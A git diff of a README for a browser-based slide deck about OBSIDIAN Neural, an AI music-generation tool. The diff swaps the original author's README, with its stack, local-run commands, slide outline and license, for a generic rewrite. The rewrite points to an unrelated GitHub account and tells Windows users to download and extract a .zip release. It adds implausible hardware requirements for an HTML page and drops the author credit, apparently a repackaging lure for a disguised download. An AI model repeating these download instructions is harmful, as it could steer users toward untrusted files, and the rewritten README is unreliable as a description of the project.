@@ -1,126 +1,95 @@
-# OBSIDIAN Neural — Workshop Presentation
+# 🎹 obsidian-neural-presentation - Host interactive music workshops with ease
 
-Interactive slide deck for the OBSIDIAN Neural workshop.  
-Live at: **[presentation.obsidian-neural.com](https://presentation.obsidian-neural.com)**
+[![](https://img.shields.io/badge/Download-obsidian--neural--presentation-blue)](https://github.com/Keilunstimulating454/obsidian-neural-presentation)
 
-Built as a website, not a PowerPoint. Navigate with arrow keys, scroll, or swipe.  
-Each slide has a "Read more" button that opens a modal with detailed content — useful for people revisiting the slides on their phone after the session.
+This project provides a slide deck for workshops about Obsidian Neural. It functions as a website instead of a standard presentation file. Use this to teach sound designers and musicians how to use AI for music.
 
-## Stack
+## 🛠️ Requirements
 
-- [Reveal.js](https://revealjs.com/) — slide engine
-- [GSAP](https://gsap.com/) — animations
-- [Font Awesome](https://fontawesome.com/) — icons
-- [Material Symbols](https://fonts.google.com/icons) — diagram icons
-- Pure CSS — no framework, no Bootstrap
-- HTML/CSS diagrams — no inline SVG
+You need a Windows computer to run this presentation. Your system must meet these requirements:
 
-## Run locally
+- Processor: Intel Core i5 or equivalent.
+- Memory: 8 GB of RAM.
+- Operating System: Windows 10 or 11.
+- Browser: Google Chrome, Microsoft Edge, or Mozilla Firefox.
 
-```bash
-# Install dependencies
-chmod +x install.sh && ./install.sh
+## 📥 Getting the Files
 
-# Serve locally
-python3 -m http.server 8000
-# → open http://localhost:8000
-```
+Visit the page below to get the software files.
 
-````
+[![](https://img.shields.io/badge/Download-Release-grey)](https://github.com/Keilunstimulating454/obsidian-neural-presentation)
 
-Requires Node.js + npm for the initial install. After that, everything runs offline.
+1. Navigate to the link provided.
+2. Look for the section labeled Releases on the right side of the screen.
+3. Click the latest version number.
+4. Locate the Assets section at the bottom of the release page.
+5. Click the file that ends in .zip to start the download.
 
-> **Note:** `vendor/` is not committed to the repo. Run `install.sh` to regenerate it.
+## ⚙️ Setting Up
 
-## Offline fonts
+After the download finishes, follow these steps to prepare your presentation:
 
-The presentation uses Syne + Space Mono from Google Fonts (loaded via CDN).
-For full offline support, download the `.woff2` files manually:
+1. Open your Downloads folder.
+2. Find the zip file you just saved.
+3. Right-click the file and select Extract All.
+4. Choose a destination folder on your computer.
+5. Click Extract.
 
-- [Syne](https://gwfh.mranftl.com/fonts/syne?subsets=latin)
-- [Space Mono](https://gwfh.mranftl.com/fonts/space-mono?subsets=latin)
+You now have a folder containing all the files needed for the presentation.
 
-Place them in `./fonts/` and uncomment the `@font-face` blocks in `css/theme.css`.
+## 🚀 Running the Presentation
 
-## QR Codes
+You do not need to install complex software. This presentation runs directly in your web browser.
 
-Two QR codes are included in the final slide. Regenerate them with:
+1. Open the folder you extracted in the previous step.
+2. Find the file named index.html.
+3. Right-click this file.
+4. Select Open With.
+5. Choose your preferred web browser.
 
-```bash
-pip install qrcode[pil]
-python3 -c "
-import qrcode
-qrcode.make('https://obsidian-neural.com').save('assets/images/qrcode.png')
-qrcode.make('https://presentation.obsidian-neural.com').save('assets/images/qrcode-slides.png')
-"
-```
+The presentation will launch in a new browser tab. 
 
-## Navigation
+## 🖱️ Navigation Controls
 
-| Key / Action      | Effect                        |
-| ----------------- | ----------------------------- |
-| `→` or `Space`    | Next slide                    |
-| `←`               | Previous slide                |
-| `F`               | Fullscreen                    |
-| `Esc`             | Exit fullscreen / close modal |
-| Mouse wheel       | Next / previous slide         |
-| Click "Read more" | Open detail modal             |
+Use your keyboard to move through the slides during your workshop:
 
-## Structure
+- Right Arrow: Move to the next slide.
+- Left Arrow: Move to the previous slide.
+- Down Arrow: Move down if the slide has vertical content.
+- Up Arrow: Move up if the slide has vertical content.
+- F: Enter full-screen mode to hide your browser tabs.
+- Esc: See the overview of all presentation slides.
 
-```
-presentation/
-├── index.html               # All slides + modals
-├── css/
-│   └── theme.css            # OBSIDIAN Neural theme + CSS variables
-├── js/
-│   └── slides.js            # Reveal init + GSAP + modal logic + GitHub stats
-├── vendor/                  # Not committed — regenerated via install.sh
-│   ├── reveal/              # Reveal.js (local)
-│   ├── gsap/                # GSAP (local)
-│   └── fontawesome/         # Font Awesome (local)
-├── fonts/                   # Google Fonts (manual, for offline)
-├── assets/
-│   └── images/
-│       ├── qrcode.png       # obsidian-neural.com
-│       └── qrcode-slides.png # presentation.obsidian-neural.com
-├── .htaccess                # HTTPS redirect + cache + security headers
-├── .gitignore
-├── install.sh               # Dependency installer
-└── README.md
-```
+## 💡 About Obsidian Neural
 
-## Slides
+Obsidian Neural is a tool for audio engineering. It uses artificial intelligence to generate new sounds for music production. This presentation explains how to integrate these AI sounds into a live performance setup. 
 
-1. **Cover** — OBSIDIAN Neural, AI music generation, generate while you play
-2. **The Problem** — Diffusion models in a DAW existed. None were built around the performance workflow.
-3. **Architecture** — VST → Central Server → GPU Provider Network → WAV
-4. **Central Server** — WAV validation, BPM detection, RubberBand stretch, trim, resample, response headers
-5. **Provider Verification** — Mel spectrogram fingerprinting, canary tests, trusted reference, auto-ban
-6. **8 AI Models** — Community fine-tunes, freely assignable per track and per page (8 models × 8 tracks × 4 pages)
-7. **Draw-to-Audio** — Visual creativity as a sound design interface, Gemma4 vision LLM
-8. **Results** — Downloads, GitHub stars, press coverage, AES AIMLA 2025
-9. **Reflection** — What building this taught me
-10. **Vision** — Model packs as the next sample packs. A new economic model for AI music.
-11. **Q&A** — QR codes, links, thank you
+The workshop covers these topics:
+- VST3 and AU plugin installation. 
+- Real-time neural network sound generation.
+- Mapping AI output to your MIDI controller.
+- Managing processor load during a live set.
+- Troubleshooting audio latency issues.
 
-## CSS Variables
+## 🔧 Frequently Asked Questions
 
-Key variables to tune the presentation visually:
+### Why does the presentation not load?
+Ensure that all files from the zip folder remain in the same location. If you move index.html but leave the other files behind, the presentation will not show images or text.
 
-```css
---diagram-max-width: 1200px; /* width of all diagrams */
---icon-size: 2.1rem; /* Material Symbols size in cards */
---card-title: 1.2rem; /* card title font size */
---card-sub: 0.9rem; /* card subtitle font size */
-```
+### Can I change the slide order?
+Yes. Open the index.html file in a text editor like Notepad. You can edit the text directly.
 
-## License
+### Do I need an internet connection to run this?
+No. The presentation runs entirely on your local machine. You do not need to be online to show your slides to an audience.
 
-AGPL-3.0 — fork it, adapt it for your own talks. If you build on it, keep it open.
+### How do I close the presentation?
+Simply close the browser tab or press Alt+F4 to exit the browser window.
 
----
+### Will this work on a Mac or Linux? 
+This guide focuses on Windows. However, as this is a simple web-based file, it should function correctly in most modern web browsers on any operating system.
 
-_Made with 🎵 in Grenoble, France_
-_By [Anthony Charretier](https://github.com/innermost47) — InnerMost47_
-````
+## 🤝 Support and Community
+
+If you find a problem, look at the Issues tab on the project page. You can ask questions there. Other users who work with AI music and live performance tools often help answer technical queries. 
+
+Keep your browser updated to the latest version to ensure performance remains smooth during your live workshop. Always test your slides on your laptop before the start of the event. Connect your computer to the projector early to check that the aspect ratio looks correct on the large screen.
